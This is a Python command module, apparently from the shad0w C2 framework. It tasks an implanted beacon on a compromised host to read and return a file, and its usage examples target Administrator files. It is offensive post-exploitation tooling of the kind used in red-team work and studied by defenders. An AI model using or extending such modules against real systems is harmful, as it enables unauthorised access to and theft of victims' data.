# 
# Display the contents of a file
#

import json

__description__ = "Display the contents of a file on the target machine"
__author__ = "@_batsec_"

from lib.basecommand import BaseCommand

EXEC_ID   = 0x4000
OPCODE_LS = 0x2000


class CatCommand(BaseCommand):
    def __init__(self, args):
        BaseCommand.__init__(self, "cat", args)

    def parse_parameters(self):
        self.parser.add_argument("file", nargs='*', help="file you want to display the contents of")

    def get_usage(self):
        return """
Don't try to cat binary files, it doesnt work very well.

Examples:

cat C:\\Users\\Administrator\\root.txt
cat C:\\Users\\thejoker\\Desktop\\evil_plans.txt
"""

    def run(self, shad0w):
        # clean it up
        read_file = ' '.join(self.args.file).replace('\\', "\\\\").replace('"', '')

        # make the json
        data = {"op": OPCODE_LS, "args": read_file}
        data = json.dumps(data)

        # set a task for the current beacon to do
        shad0w.beacons[shad0w.current_beacon]["callback"] = cat_callback
        shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)


def cat_callback(shad0w, data):
    shad0w.debug.log(data, log=True, pre=False)

    return ""

def main(shad0w, args):
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return
    
    cmd = CatCommand(args)
    if cmd.parse():
        cmd.run(shad0w)